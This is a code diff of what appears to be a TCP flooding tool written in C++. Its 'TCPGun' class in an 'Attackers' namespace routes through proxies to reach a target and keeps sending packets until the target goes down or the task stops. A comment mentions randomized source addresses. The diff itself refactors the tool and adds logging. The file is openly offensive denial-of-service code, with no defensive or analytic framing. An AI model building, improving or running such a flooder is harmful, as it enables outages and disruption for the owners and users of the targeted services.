@@ -1,3 +1,6 @@
+#include <netdb.h>
+#include <netinet/in.h>
+
 #include "spdlog/spdlog.h"
 
 #include "tcp_gun.h"
@@ -12,14 +15,15 @@ using namespace Attackers;
 
 void TCPGun::FireTillDead(const Target &targetToKill) noexcept
 {
-	FireWithProxy(targetToKill);
-
+	SPDLOG_INFO("Firing at {} without proxy", targetToKill.address);
 	FireWithoutProxy(targetToKill);
+
+	SPDLOG_INFO("Firing at {} with proxy", targetToKill.address);
+	FireWithProxy(targetToKill);
 }
 
 std::optional<Target> TCPGun::Aim(const CURI &uriToAttack) noexcept
 {
-	TCPWrapper tcpAttacker;
 	Informator informer;
 	informer.LoadNewData();
 
@@ -28,7 +32,7 @@ std::optional<Target> TCPGun::Aim(const CURI &uriToAttack) noexcept
 	{
 		if(const auto proxies = informer.GetProxies())
 		{
-			if(auto resolvedAddress{tcpAttacker.CheckConnection(uriToAttack, *proxies)})
+			if(auto resolvedAddress{m_attacker.CheckConnection(uriToAttack, *proxies)})
 			{
 				return *resolvedAddress;
 			}
@@ -67,15 +71,13 @@ void TCPGun::FireWithProxy(const Target &targetToKill) noexcept
 	}
 
 	// Checking connectivity over proxy, because packets would be send with randomized source
-	const std::string currentTarget
-		{targetToKill.address + ':' + std::to_string(targetToKill.port)};
-	TCPWrapper tcpAttacker;
-	auto resolvedAddress{tcpAttacker.CheckConnection(CURI(currentTarget), *proxies)};
+	const CURI currentTarget{targetToKill.address + ':' + std::to_string(targetToKill.port)};
+	auto resolvedAddress{m_attacker.CheckConnection(currentTarget, *proxies)};
 	while(!m_currentTask.ShouldStop() && resolvedAddress)
 	{
 		SPDLOG_INFO("{} is up", resolvedAddress->address);
 		ShootTarget(*resolvedAddress);
-		resolvedAddress = tcpAttacker.CheckConnection(CURI(currentTarget), *proxies);
+		resolvedAddress = m_attacker.CheckConnection(currentTarget, *proxies);
 	}
 }
 
@@ -95,6 +97,7 @@ bool TCPGun::ShootTarget(const Target &targetToShoot)
 			return true;
 		}
 	}
-	SPDLOG_INFO("Already sent: {} packets, rechecking target...", count);
+	SPDLOG_INFO("Already sent: {} packets to {} on port {}, rechecking target...", 
+		count, targetToShoot.address, htons(targetToShoot.port));
 	return false;
 }
